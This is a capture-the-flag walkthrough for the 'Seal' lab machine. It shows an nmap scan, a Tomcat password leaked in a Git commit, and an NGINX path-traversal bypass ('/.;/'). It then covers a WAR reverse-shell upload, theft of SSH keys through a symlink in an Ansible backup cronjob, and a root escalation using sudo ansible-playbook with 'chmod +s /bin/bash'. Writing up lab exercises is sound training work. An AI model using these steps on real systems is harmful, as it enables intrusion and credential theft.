# Seal

- Target Machine: 10.10.10.250

## Enumeration

### nmap scan

```bash
# Nmap 7.92SVN scan initiated Sun Sep 19 16:27:36 2021 as: nmap -p- -oN nmap/all_ports -v 10.10.10.250
Nmap scan report for 10.10.10.250
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
443/tcp  open  https
8080/tcp open  http-proxy

Read data files from: /usr/local/bin/../share/nmap
# Nmap done at Sun Sep 19 16:28:16 2021 -- 1 IP address (1 host up) scanned in 40.52 seconds
```

At the end of the port 443 website page we can see the following email address: __admin@seal.htb__.
The website on port 8080 contains a GitBucket private hosting platform.

After registering on the GitBucket service, we can see two repositories that we have access to: root/infra and root/seal_market. We can also see three other accounts registered: Alex, Luis and Root.

Looking through the commits, we can also see the following credentials in the commit "Updating tomcat configuration"
	
```xml
<!--
    <user username="tomcat" password="<must-be-changed>" roles="tomcat"/>
    <user username="both" password="<must-be-changed>" roles="tomcat,role1"/>
    <user username="role1" password="<must-be-changed>" roles="role1"/>
-->
<user username="tomcat" password="42MrHBf*z8{Z%" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

We can also find the following NGINX paths added in the "Updating nginx configuration" commit:

```js
location /manager/html {
				if ($ssl_client_verify != SUCCESS) {
					return 403;
				}
...

location /admin/dashboard {
				if ($ssl_client_verify != SUCCESS) {
					return 403;
				}
...

location /host-manager/html {
                if ($ssl_client_verify != SUCCESS) {
                    return 403;
                }
...
```

## Accessing the machine

Trying to access this paths prompts us with 403 Forbidden error message. However, we can bypass this block by using __path traversal__: we have to simply add a `/.;/` before the last element in the path, making NGNIX redirect us the that very same page, but ignoring the block (i.e. `https://10.10.10.250/admin/.;/dashboard/`).

The admin dashboard page contains nothing at all, while the other two pages prompt out an authorization request where we can login using the credentials found earlier `tomcat : 42MrHBf*z8{Z%`.
The host-manager page enables us to add some virtual hosts, while the manager page enables us to upload a .war file. We can upload a WAR [reverse shell](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#war) and trigger it

__ATTENTION__: you must catch the upload request with BurpSuite and and edit it using again the path traversal exploit (GET /manager/.;/html/upload?....) or else the server will deny the request with a 403 error again

After uploading the file, we can run a netcat listener and trigger the revshell by clicking on it directly from the page

## Lateral movement

Using ps aux we can see the following cronjob being executed by root:

```bash
...
tomcat    107490  0.0  0.2  15756  9760 ?        S    17:28   0:00 python3 -c import pty; pty.spawn('/bin/bash')
tomcat    107491  0.0  0.0   7104  3892 pts/0    Ss   17:28   0:00 /bin/bash
root      108228  0.0  0.0   8356  3380 ?        S    17:32   0:00 /usr/sbin/CRON -f
root      108229  0.0  0.0   2608   540 ?        Ss   17:32   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
root      108230  0.0  0.0   5476   580 ?        S    17:32   0:00 sleep 30
```

Looking at the contents of the `/opt/backups/playbook/run.yml` file, we can see that every file in `/var/lib/tomcat9/webapps/ROOT/admin/dashboard` gets copied to `/opt/backups/files`, including links. Then, an archive containing every file in `/opt/backups/files` gets created in the path `/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz`. In the end, every file in `/opt/backups/files` gets deleted

```bash
tomcat@seal:/opt/backups/playbook$ cat run.yml
cat run.yml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

Since this process also copies links, we could abuse this creating a symlink to luis' SSH keys, which then will get copied to the backup file.

```bash

mkdir /tmp/baks

ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads

# WAIT FOR THE CRONJOB TO RUN
# CHECK WITH PS AUX
  
ls /opt/backups/archives/  
  
cp /opt/backups/archives/backup-{THE_LATEST_DATE}.gz /tmp/baks/luis_rsa.gz
  
gzip -kd luis_rsa.gz && tar -xf luis_rsa  
  
cd dashboard/uploads/.ssh  
  
cat id_rsa
```

Now that we can use luis' private key to SSH into the machine

## Priviledge escalation

We can see that luis can run the following command as root

```bash
luis@seal:~$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *

luis@seal:~$ 
```

We have to create a fake ansible playbook to be run by this software. We can mimic the one found in `/opt/backups/playbook/run.yml`. After a quick research on the internet, we find out that playbooks can run the command `chmod`, which we can use to change `/bin/bash` permissions.

```bash
luis@seal:~$ cd /dev/shm

luis@seal:/dev/shm$ vim run.yml 

# WRITE THIS IN THE FILE

- hosts: localhost
  tasks:
  - name: Gimme root!
    command: "chmod +s /bin/bash"

luis@seal:/dev/shm$ sudo /usr/bin/ansible-playbook /dev/shm/run.yml

luis@seal:/dev/shm$ /bin/bash -p

bash-5.0# id
uid=1000(luis) gid=1000(luis) euid=0(root) egid=0(root) groups=0(root),1000(luis)
```